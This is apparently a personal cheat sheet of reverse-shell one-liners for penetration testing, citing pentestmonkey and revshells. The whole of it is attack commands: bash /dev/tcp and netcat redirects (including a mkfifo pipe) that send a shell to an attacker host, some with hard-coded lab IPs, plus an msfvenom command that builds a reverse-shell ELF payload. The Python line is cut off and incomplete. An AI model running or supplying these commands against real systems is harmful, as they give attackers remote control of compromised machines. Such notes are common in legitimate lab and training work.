https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
https://www.revshells.com/
## Bash
```
bash -i >& /dev/tcp/$ip/4444 0>&1

For editing purposes:
bash -i >& /dev/tcp/10.10.14.87/4444 0>&1
```
## Netcat
```
nc -e /bin/sh $ip 4444

OR

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $ip 4444 >/tmp/f

For editing purposes:
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.87 4444 >/tmp/f
```
## Python
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234))
```
## msfvenom
```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.45.220 LPORT=443 -f elf -o reverse.elf
```
